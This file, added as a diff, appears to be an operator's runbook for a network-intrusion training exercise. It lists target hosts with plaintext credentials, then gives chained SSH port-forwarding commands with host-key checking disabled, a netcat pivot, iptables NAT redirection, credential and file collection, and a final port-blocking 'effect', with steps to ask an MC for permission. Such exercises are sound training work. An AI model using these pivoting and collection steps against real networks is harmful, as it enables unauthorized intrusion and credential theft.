@@ -1,0 +1,185 @@
+BELLIGERENTBADGER04
+2022-08-25
+>T1: 10.50.29.166
+->T2: 10.20.169.122
+->T3: 10.20.169.10
+->T5: 10.20.169.30
+-->T6: 10.20.169.239
+--->T7: 192.186.169.41
+---->T8: 192.186.169.201
+----->T9: 129.168.169.186
+->T10: 10.20.169.121
+
+
+T1:
+Hostname: EXT_RTR
+IP: 10.50.29.166 // 10.20.169.33
+OS: Linux v. unknown
+Creds: engineer#::enshallah
+Last Known SSH Port: 10123
+ssh -MS /tmp/T1 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null engineer4@10.50.29.166 -p 10123
+enshallah
+Action: Perform SSH masquerade with credentials successful in previous operation. 
+@Confirm health and status of the device and maneuver to the next target.
+####ASK EA####
+
+
+
+T2:
+Hostname: STORAGE1
+IP: 10.20.169.122
+OS: Windows Server 2019
+Creds: caisson#::tread_depth
+Last Known SSH Port: 52203
+ssh -S /tmp/T1 bad -O forward -L 2222:10.20.169.122:52203
+ssh -MS /tmp/T2 -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null caisson4@localhost
+tread_depth
+Action: Perform SSH masquerade with credentials successful in previous operation. 
+@Confirm health and status of the device and maneuver to the next target.
+
+ssh -S /tmp/T1 bad -O cancel -L 2222:10.20.169.122:52203
+#######################DISCONNECT FROM T2######################
+
+
+T3:
+Hostname: CHATSVR
+IP: 10.20.169.10
+OS: Windows Server 2019
+Creds: caisson#::tread_depth
+Last Known SSH Port: 52203
+ssh -S /tmp/T1 bad -O forward -L 3333:10.20.169.10:52203
+ssh -MS /tmp/T3 -p 3333 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null caisson4@localhost
+tread_depth
+Action: Perform SSH masquerade with credentials successful in previous operation. 
+@Confirm health and status of the device and maneuver to the next target.
+
+ssh -S /tmp/T1 bad -O cancel -L 3333:10.20.169.10:52203
+#######################DISCONNECT FROM T3#######################
+
+
+T5:
+Hostname: STORAGE2
+IP: 10.20.169.30
+OS: Windows Server 2019
+Creds: caisson#::tread_depth
+Last Known SSH Port: 52203
+ssh -S /tmp/T1 bad -O forward -L 5555:10.20.169.30:52203
+ssh -MS /tmp/T5 -p 5555 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null caisson4@localhost
+tread_depth
+Action: Perform SSH masquerade with credentials successful in previous operation. 
+@Confirm health and status of the device and maneuver to the next target.
+
+GOTO T6
+
+
+T6:
+Hostname: Vyos2
+IP: 10.20.169.239
+OS: Vyos
+Creds: NOC_Admin#::AhmdLxu29D
+Last Known SSH Port: 52230
+ssh -S /tmp/T5 bad -O forward -L 6666:10.20.169.239:52230
+ssh -MS /tmp/T6 -p 6666 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null NOC_Admin4@localhost
+AhmdLxu29D
+Action: Perform SSH masquerade with credentials successful in previous operation. 
+@Confirm health and status of the device and maneuver to the next target.
+
+
+T7:
+Hostname: ADMIN2
+IP: 192.186.169.41//10.101.169.93
+OS: CentOS7
+Creds: askar#::DaXedayLasarah
+Last Known SSH Port: 33715
+ssh -S /tmp/T6 bad -O forward -L 7777:192.186.169.41:33715
+ssh -MS /tmp/T7 -p 7777 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null askar4@localhost
+DaXedayLasarah
+Action:  Perform SSH masquerade with credentials successful in previous operation. 
+@Confirm health and status of device. 
+@@Collect any new files of interest. Maneuver to next target.
+
+
+T8:
+Hostname: DESKTOP-USER21
+IP: 192.186.169.201
+OS: Linux v Unknown
+Creds: N/A
+Last Known SSH Port: None
+ssh -S /tmp/T7 bad -O forward -L 8888:192.186.169.201:4474
+nc localhost 8888
+
+Action: Perform netcat connection via port 447# (i.e Student8 is 4478 or student 12 is 44712). 
+@If successful, confirm health and status of the device. 
+@@Perform IPtables redirection (utilizing Network Address Translation) to allow for connection to T9 utilizing port 123## (i.e Student8 is 12308 or student 12 is 12312) and connecting to follow-on target’s ssh port.  
+@@@Collect any new files of interest. Maneuver to next target.
+
+sudo iptables -t nat -L
+cat /proc/sys/net/ipv4/ip_forward
+<MC permission>
+sudo iptables -t nat -A PREROUTING -p tcp --dport 12304 -j DNAT --to-destination 129.168.169.52:33715
+sudo iptables -t nat -A POSTROUTING -p tcp -d 129.168.169.186 -j SNAT --to-source 192.186.169.201
+
+<DELETE RULES#########################> ASK MC PERMISSION
+sudo iptables -t nat -D PREROUTING -p tcp --dport 12304 -j DNAT --to-destination 129.168.169.52:33715
+sudo iptables -t nat -D POSTROUTING -p tcp -d 129.168.169.186 -j SNAT --to-source 192.186.169.201
+
+
+T9:
+Hostname: Unknown
+IP: 129.168.169.52
+OS: Linux v Unknown
+Creds: Unknown - Request analyst input
+Last Known SSH Port: 33715
+ssh -S /tmp/T7 bad -O forward -L 9999:192.186.169.201:12304
+ssh -MS /tmp/T9 -p 9999 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null askar4@localhost
+DaXedayLasarah
+Action: Test credentials supplied by analyst via SSH masquerade. 
+@Conduct device survey. 
+@@Collect any files of interest, particularly any credentials.
+
+################BURN OFF UNTIL T5###############################
+make sure you delete IPTABLES and ask permission
+#################DID YOU BURN OFFF????################3
+
+
+T10: >>web server<<
+Hostname: WEBSERVER
+IP: 10.20.169.121
+OS: CentOS7
+Creds: caisson#::tread_depth
+Last Known SSH Port: 52203
+ssh -S /tmp/T1 bad -O forward -L 1111:10.20.169.121:52203
+ssh -MS /tmp/T10 -p 1111 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null caisson4@localhost
+tread_depth
+Action: Test credentials supplied by analyst via SSH masquerade. 
+@Conduct device survey. 
+@@Confirm device is the correct web server with analyst. 
+@@@Apply T10 effect. Conclude operation.
+T10 effect: Modify iptables as outlined in Prior Approvals section. Confirm rules are in place and operating as desired. Remove rules at MC direction.
+sudo iptables -t nat -L
+cat /proc/sys/net/ipv4/ip_forward
+<ASK MC PERMISSION>
+sudo iptables -A OUTPUT -p tcp --dport 480 -j REJECT
+sudo iptables -A INPUT -p tcp --dport 480 -j REJECT
+sudo iptables -L INPUT -n
+sudo iptables -S OUTPUT
+sudo iptables -L OUTPUT -n
+Remove rules at MC direction.
+ONLY for a period of time determined by the MC 
+
+sudo iptables -D OUTPUT -p tcp --dport 480 -j REJECT
+sudo iptables -D INPUT -p tcp --dport 480 -j REJECT
+
+
+
+DEBRIEF Template
+
+Operator: <your name>
+
+Operation: <name of operation>
+
+MC: <name of MC>
+
+Analyst: <name of analyst>
+
+Description: <two-three sentence description of operation as well as one sentence summary per target.>
